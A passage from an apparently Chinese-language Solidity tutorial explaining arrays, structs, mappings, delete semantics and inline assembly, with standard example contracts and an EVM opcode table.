completely</span></span><br><span class="line">        <span class="keyword">delete</span> m_pairsOfFlags;</span><br><span class="line">        <span class="keyword">delete</span> m_aLotOfIntegers;</span><br><span class="line">        <span class="comment">// identical effect here</span></span><br><span class="line">        m_pairsOfFlags.length = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bytes m_byteData;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">byteArrays</span>(<span class="params">bytes memory data</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// byte arrays ("bytes") are different as they are stored without padding,</span></span><br><span class="line">        <span class="comment">// but can be treated identical to "uint8[]"</span></span><br><span class="line">        m_byteData = data;</span><br><span class="line">        m_byteData.length += <span class="number">7</span>;</span><br><span class="line">        m_byteData[<span class="number">3</span>] = <span class="number">0x08</span>;</span><br><span class="line">        <span class="keyword">delete</span> m_byteData[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addFlag</span>(<span class="params">bool[<span class="number">2</span>] memory flag</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_pairsOfFlags.push(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createMemoryArray</span>(<span class="params">uint size</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">bytes memory</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamic memory arrays are created using `new`:</span></span><br><span class="line">        uint[<span class="number">2</span>][] memory arrayOfPairs = <span class="keyword">new</span> uint[<span class="number">2</span>][](size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Inline arrays are always statically-sized and if you only</span></span><br><span class="line">        <span class="comment">// use literals, you have to provide at least one type.</span></span><br><span class="line">        arrayOfPairs[<span class="number">0</span>] = [uint(<span class="number">1</span>), <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a dynamic byte array:</span></span><br><span class="line">        bytes memory b = <span class="keyword">new</span> bytes(<span class="number">200</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; b.length; i++)</span><br><span class="line">            b[i] = byte(uint8(i));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>结构(struct)  </li>
</ul>
<p>&emsp;&emsp;Solidity提供了一种声明新的类型的方法，即struct。struct与C/C++一样，用法如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.11</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract CrowdFunding &#123;</span><br><span class="line">    <span class="comment">// Defines a new type with two fields.</span></span><br><span class="line">    struct Funder &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        uint amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Campaign &#123;</span><br><span class="line">        address payable beneficiary;</span><br><span class="line">        uint fundingGoal;</span><br><span class="line">        uint numFunders;</span><br><span class="line">        uint amount;</span><br><span class="line">        mapping (<span class="function"><span class="params">uint</span> =&gt;</span> Funder) funders;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint numCampaigns;</span><br><span class="line">    mapping (<span class="function"><span class="params">uint</span> =&gt;</span> Campaign) campaigns;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">newCampaign</span>(<span class="params">address payable beneficiary, uint goal</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint campaignID</span>) </span>&#123;</span><br><span class="line">        campaignID = numCampaigns++; <span class="comment">// campaignID is return variable</span></span><br><span class="line">        <span class="comment">// Creates new struct in memory and copies it to storage.</span></span><br><span class="line">        <span class="comment">// We leave out the mapping type, because it is not valid in memory.</span></span><br><span class="line">        <span class="comment">// If structs are copied (even from storage to storage), mapping types</span></span><br><span class="line">        <span class="comment">// are always omitted, because they cannot be enumerated.</span></span><br><span class="line">        campaigns[campaignID] = Campaign(beneficiary, goal, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params">uint campaignID</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        Campaign storage c = campaigns[campaignID];</span><br><span class="line">        <span class="comment">// Creates a new temporary memory struct, initialised with the given values</span></span><br><span class="line">        <span class="comment">// and copies it over to storage.</span></span><br><span class="line">        <span class="comment">// Note that you can also use Funder(msg.sender, msg.value) to initialise.</span></span><br><span class="line">        c.funders[c.numFunders++] = Funder(&#123;<span class="attr">addr</span>: msg.sender, <span class="attr">amount</span>: msg.value&#125;);</span><br><span class="line">        c.amount += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkGoalReached</span>(<span class="params">uint campaignID</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool reached</span>) </span>&#123;</span><br><span class="line">        Campaign storage c = campaigns[campaignID];</span><br><span class="line">        <span class="keyword">if</span> (c.amount &lt; c.fundingGoal)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        uint amount = c.amount;</span><br><span class="line">        c.amount = <span class="number">0</span>;</span><br><span class="line">        c.beneficiary.transfer(amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;该合同不提供众筹合同的全部功能，但它包含理解结构所必需的基本概念。结构可被用于映射(mapping)或者数组(array)类型，并且结构也可以包含映射与数组。  </p>
<p>&emsp;&emsp;与C++类似，结构不可包含其自身成员对象，这个限制是必须的，否则无线递归将导致该类型的内存无限大。  </p>
<blockquote>
<p>注意：  </p>
<blockquote>
<p>在函数中，把state结构类型变量赋值给一个局部storage类型变量时，并不会复制该对象，而仅仅将一个引用赋值给该局部变量，所以该局部变量可以写入state变量。</p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;当然，在函数中你可以直接访问一个结构对象的成员，而不必将其再次赋值给一个局部变量，因为Solidity为其创建了getter。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">campaigns[campaignID].amount = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>映射(Mapping)  </li>
</ul>
<p>&emsp;&emsp;映射与python中的字典类似但意义不同，其声明的语法如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mapping(<span class="function"><span class="params">_KeyType</span> =&gt;</span> _ValueType)</span><br><span class="line"></span><br><span class="line"><span class="comment">//_KeyType可以是任意初等型</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这意味着_KeyType可以是任何内置值类型加上bytes和string类型，但是不能被定义为复杂类型(contract types, enums, mappings, structs 以及除了bytes与string之外的所有array类型)._ValueType则可以为任意类型，包括映射。  </p>
<p>&emsp;&emsp;你可以将映射理解为哈希表(Hash Table)，Key的值不储存在映射中，我们只用他的<code>keccak256</code>来进行索引。  </p>
<blockquote>
<p>因此，映射没有要设置的键或值的长度或概念。  </p>
</blockquote>
<p>&emsp;&emsp;映射类型具有storage的数据储存类型，因此他允许作为状态变量，或者作为storage的引用在函数中存在，或者作为library函数的参数。但是他们不能用于public函数的返回值或者参数。  </p>
<p>&emsp;&emsp;你可以将映射标记为public类型，并且Solidity为他创建了一个getter()接口，_KeyType将作为getter()的参数，如果_ValueType是值类型或者结构类型，那么getter将直接返回该对象，如果_ValueType是数组或映射，那么getter将返回一个包含所有_KeyType的变量，这将可以递归下去。 实例如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MappingExample &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">uint newBalance</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] = newBalance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MappingUser &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        MappingExample m = <span class="keyword">new</span> MappingExample();</span><br><span class="line">        m.update(<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">return</span> m.balances(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>映射类型是不可迭代的，但是你可以用他实现数据结构。    </p>
</blockquote>
<hr>
<ul>
<li>delete  </li>
</ul>
<p>&emsp;&emsp;Solidity的delete与其他语言有所不同，这里的delete是将一个对象清零，你甚至可以用他来进行变量声明，<code>delete a</code>是将a初始化为0,若delete作用于动态数组则将其length变为0,若作用于静态数组则将其所有元素清零。<code>delete a[x]</code>则将清除这个单独的元素，并不会改变length和其他元素，但是这意味着数组留下了间隙，如果你打算删除数组中的元素，或许映射是更好的选择。   </p>
<p>&emsp;&emsp;若作用于结构，它将重新初始化结构。换言之，删除后a的值与声明a时的值相同，但需注意以下事项：  </p>
<blockquote>
<p>delete对映射无效，因此假如struct中含有映射对象，delete并不会递归执行。但是映射单独的键值关系可以被删除：  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> a[msg.sender];		<span class="comment">//这将是有效的</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>当对象a是一个引用时，delete将不会修改其原来的值，而是直接重置a对象本身。  </p>
</blockquote>
<p>&emsp;&emsp;用法如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract DeleteExample &#123;</span><br><span class="line">    uint data;</span><br><span class="line">    uint[] dataArray;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint x = data;</span><br><span class="line">        <span class="keyword">delete</span> x; <span class="comment">// sets x to 0, does not affect data</span></span><br><span class="line">        <span class="keyword">delete</span> data; <span class="comment">// sets data to 0, does not affect x</span></span><br><span class="line">        uint[] storage y = dataArray;</span><br><span class="line">        <span class="keyword">delete</span> dataArray; <span class="comment">// this sets dataArray.length to zero, but as uint[] is a complex object, also</span></span><br><span class="line">        <span class="comment">// y is affected which is an alias to the storage object</span></span><br><span class="line">        <span class="comment">// On the other hand: "delete y" is not valid, as assignments to local variables</span></span><br><span class="line">        <span class="comment">// referencing storage objects can only be made from existing storage objects.</span></span><br><span class="line">        assert(y.length == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-汇编基础-Solidity-Addembly"><a href="#3-汇编基础-Solidity-Addembly" class="headerlink" title="3. 汇编基础(Solidity Addembly)"></a>3. 汇编基础(Solidity Addembly)</h3><ul>
<li>指令集  </li>
</ul>
<p>&emsp;&emsp;首先，我们来给出Solidity的指令集，这些东西有利于理解opcodes(操作码)  </p>
<p>&emsp;&emsp;如果opcode带有参数(从栈顶获取)，那么参数将在括号内给出。注意，在非函数样式中，参数的顺序反了过来，这很容易理解，他与C语言传参方式相同。opcode如果带有 <code>-</code> 标记，那么他将不会往栈上push一个对象(即无返回值)，如果带有*标记，代表他们比较特殊，其他没有标记的instruction将会向栈上push一个对象，这将是他们的返回值。若opcode被F，H，B或者C标记，那么他们分别是出现自 <strong>Frontier, Homestead, Byzantium or Constantinople</strong>.  <strong> Constantinople </strong>仍然在计划中，所有被标记C的指令将导致无效或异常。  </p>
<p>&emsp;&emsp;在以下指令中<strong>mem[)</strong>表示从a开始但不包括b的memory字节，<strong>storage[p]</strong>表示包含在p位置的storage内容。  </p>
<blockquote>
<p>pushi与jumpdest不能被直接使用。</p>
</blockquote>
<p>&emsp;&emsp;在语法中，操作码被表示为预先定义的标识符。  </p>
<table>
<thead>
<tr>
<th style="text-align:left">指令(Instruction)</th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:left">解释(解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">stop</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">停止执行，等价于return(0,0)</td>
</tr>
<tr>
<td style="text-align:left">add(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x + y</td>
</tr>
<tr>
<td style="text-align:left">sub(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x - y</td>
</tr>
<tr>
<td style="text-align:left">mul(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x * y</td>
</tr>
<tr>
<td style="text-align:left">div(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x / y</td>
</tr>
<tr>
<td style="text-align:left">sdiv(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x / y, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">mod(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x % y</td>
</tr>
<tr>
<td style="text-align:left">smod(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x % y, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">exp(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x的y次幂</td>
</tr>
<tr>
<td style="text-align:left">not(x)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">~x, x的每位取非</td>
</tr>
<tr>
<td style="text-align:left">lt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &lt; y 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">gt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &gt; y 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">slt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &lt; y 则为1, 否则为0, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">sgt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &gt; y 则为1, 否则为0, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">eq(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x == y 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">iszero(x)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x == 0 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">and(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">按位将x y进行and运算</td>
</tr>
<tr>
<td style="text-align:left">or(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">按位将x y进行or运算</td>
</tr>
<tr>
<td style="text-align:left">xor(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">按位将x y进行xor运算</td>
</tr>
<tr>
<td style="text-align:left">byte(x, x)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x的第n个字节，其中最重要的字节是第0个字节</td>
</tr>
<tr>
<td style="text-align:left">shl(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">C</td>
<td style="text-align:left">将y逻辑左偏移x位</td>
</tr>
<tr>
<td style="text-align:left">sar(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">C</td>
<td style="text-align:left">将y逻辑右偏移x位</td>
</tr>
<tr>
<td style="text-align:left">addmod(x, y, m)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">(x + y) % m 具有任意精度的运算</td>
</tr>
<tr>
<td style="text-align:left">mulmod(x, y, m)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">(x * y) % m 具有任意精度的运算</td>
</tr>
<tr>
<td style="text-align:left">keccak256(p, n)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">keccak(mem[p…(p+n)))</td>
</tr>
<tr>
<td style="text-align:left">jump(label)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">jump到 label / code 的位置</td>
</tr>
<tr>
<td style="text-align:left">jumpi(lable, cond)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">jump到  label 若 cond 非零</td>
</tr>
<tr>
<td style="text-align:left">pc</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前代码位置</td>
</tr>
<tr>
<td style="text-align:left">pop(x)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">stack弹出一个元素</td>
</tr>
<tr>
<td style="text-align:left">dup 1 … dup 16</td>
<td style="text-align:center">*</td>
<td style="text-align:center">F</td>
<td style="text-align:left">将第n个stack的slot复制到栈顶(从顶算起)</td>
</tr>
<tr>
<td style="text-align:left">swap 1 … swap 16</td>
<td style="text-align:center">*</td>
<td style="text-align:center">F</td>
<td style="text-align:left">交换顶与栈底的第n个slot</td>
</tr>
<tr>
<td style="text-align:left">mload(p)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">mem[p…(p+32))</td>
</tr>
<tr>
<td style="text-align:left">mstore(p, v)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">mem[p…(p+32)) := v</td>
</tr>
<tr>
<td style="text-align:left">mstore8(p, v)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">mem[p] := v &amp; 0xff 只修改一个字节</td>
</tr>
<tr>
<td style="text-align:left">sload(p)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">storage[p]</td>
</tr>
<tr>
<td style="text-align:left">sstore(p, v)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">storage[p] := v</td>
</tr>
<tr>
<td style="text-align:left">msize</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">memory的大小，即最大可访问的内存索引</td>
</tr>
<tr>
<td style="text-align:left">gas</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">仍可用于执行的gas的量</td>
</tr>
<tr>
<td style="text-align:left">address</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前合约或正在执行的上下文的地址</td>
</tr>
<tr>
<td style="text-align:left">balance(a)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">地址a的账户存款,以wei表示</td>
</tr>
<tr>
<td style="text-align:left">caller</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">call的sender(不包括delegatecall)</td>
</tr>
<tr>
<td style="text-align:left">callvalue</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前发送call所发送eth的总量,以wei表示</td>
</tr>
<tr>
<td style="text-align:left">calldatasize</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">以字节表示的当前call data的大小</td>
</tr>
<tr>
<td style="text-align:left">calldatacopy(t, f, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">从calldata的f位置复制s个字节到memory的t位置</td>
</tr>
<tr>
<td style="text-align:left">extcodesize</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前合约或上下文的代码的大小</td>
</tr>
<tr>
<td style="text-align:left">extcodecopy(a, t, f, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">与codecopy(t, f, s)类似,但是是从地址a处复制</td>
</tr>
<tr>
<td style="text-align:left">returndatasize</td>
<td style="text-align:center"></td>
<td style="text-align:center">B</td>
<td style="text-align:left">上次返回值的大小</td>
</tr>
<tr>
<td style="text-align:left">returndatacopy(t, f, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">B</td>
<td style="text-align:left">将f位置的返回值复制s字节到memory的t位置</td>
</tr>
<tr>
<td style="text-align:left">extcodehash(a)</td>
<td style="text-align:center"></td>
<td style="text-align:center">C</td>
<td style="text-align:left">地址a的hash</td>
</tr>
<tr>
<td style="text-align:left">create(v, p , n)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">以mem[p…(p+n))处的代码创建一个新的合约并且发送v数量的wei,返回新地址</td>
</tr>
<tr>
<td style="text-align:left">call(g, a, v, in, insize,out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">将mem[in…(in+insize))作为输入调用a地址的合约,提供g数量的gas,若出错则返回0(gas耗尽),成功返回1</td>
</tr>
<tr>
<td style="text-align:left">callcode(g, a, v, in, insize, out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">与call相同,但是保留当前上下文</td>
</tr>
<tr>
<td style="text-align:left">delegatecall(g, a, in, insize, out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">B</td>
<td style="text-align:left">与callcode相同,但是保持当前的caller与callvalue</td>
</tr>
<tr>
<td style="text-align:left">staticcall(g, a, in, insize, out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">B</td>
<td style="text-align:left">与call(g, a, 0, in, insize, out, outsize)相同,但是不允许状态改变</td>
</tr>
<tr>
<td style="text-align:left">return(p, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">结束执行,返回mem[p…(p+s))处的数据</td>
</tr>
<tr>
<td style="text-align:left">revert(p, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">B</td>
<td style="text-align:left">结束执行,回滚状态的改变,返回mem[p…(p+s))处的数据</td>
</tr>
<tr>
<td style="text-align:left">selfdestruct(a)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">结束执行,销毁当前合约,并将全部余额打入地址a</td>
</tr>
<tr>
<td style="text-align:left">invalid</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">以无效指令结束执行</td>
</tr>
<tr>
<td style="text-align:left">origin</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">交易发送者</td>
</tr>
<tr>
<td style="text-align:left">gasprice</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">交易的gas价格</td>
</tr>
<tr>
<td style="text-align:left">blockhash(b)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">块nr b的哈希-仅限于最近256个块,不包括当前块</td>
</tr>
<tr>
<td style="text-align:left">coinbash</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前挖矿的收益</td>
</tr>
<tr>
<td style="text-align:left">timestamp</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">以秒为单位的当前区块的时间戳,从创世纪开始算起</td>
</tr>
<tr>
<td style="text-align:left">number</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前的区块数</td>
</tr>
<tr>
<td style="text-align:left">difficulty</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前区块的困难度</td>
</tr>
<tr>
<td style="text-align:left">gaslimit</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前区块的gas限制</td>
</tr>
</tbody>
</table>
<ul>
<li>字面量(Literals)</li>
</ul>
<p>&emsp;&emsp;你可以直接使用十进制或者十六进制的符号作为整数常量，并且pushi指令将会自动执行，如下代码2+3的到5然后和string “abc”进行and运算。最终结果被赋值给局部变量x。string是左对齐的并且不能超过32字节。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123; <span class="keyword">let</span> x := and(<span class="string">"abc"</span>, add(<span class="number">3</span>, <span class="number">2</span>)) &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数风格(Functional Style)</li>
</ul>
<p>&emsp;&emsp;对于opcode序列,通常很难看到某些opcode的实际参数是什么。如下例子中，3被加到当前memory的0x80的的位置。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> <span class="number">0x80</span> mload add <span class="number">0x80</span> mstore</span><br></pre></td></tr></table></figure>
<p>Solidity的内联汇编有函数风格的表示，如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstore(<span class="number">0x80</span>, add(mload(<span class="number">0x80</span>), <span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果从右到左读取代码，最终得到的常量和opcode序列完全相同，但值的结束位置要清楚得多。  </p>
<p>&emsp;&emsp;如果您关心确切的栈布局，只需注意函数或opcode的语法第一个参数将放在栈的顶部。  </p>
<ul>
<li>访问外部调用变量，函数和库  </li>
</ul>
<p>&emsp;&emsp;你可以使用Solidity变量和其他标识符的名称来访问它们。对于存储在memory位置中的变量，他们的地址而不是值将会被推送到栈上。存储在storage位置中的变量是不同的，因为它们可能不会占用完整的存储槽，所以它们的”地址”由slot和slot内的字节偏移量组成。要检索变量x指向的插槽，可以使用x_slot，并使用x_offset字节偏移量索引。  </p>
<p>&emsp;&emsp;例如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.11</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint x</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint r</span>) </span>&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r := mul(x, sload(b_slot)) <span class="comment">// ignore the offset, we know it is zero</span></span><br><span class="line">        &#125;</span><br><span 